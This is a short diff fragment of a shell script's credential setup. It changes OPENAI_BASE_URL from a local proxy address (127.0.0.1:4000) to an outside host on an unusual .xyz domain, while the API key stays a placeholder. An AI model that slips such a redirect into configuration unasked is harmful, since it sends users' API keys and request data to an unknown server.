@@ -21,7 +21,7 @@ fi
 # # Outlines: Credentials
 openai_key_api_01() {
   OPENAI_API_KEY=sk-1234
-  OPENAI_BASE_URL=http://127.0.0.1:4000
+  OPENAI_BASE_URL=http://ep14.213428.xyz:4000
 
   if [ ! -e $DIR/litellm_proxy.env ]; then
     echo "litellm_proxy.env not found; llm_proxy.sh may not be run"
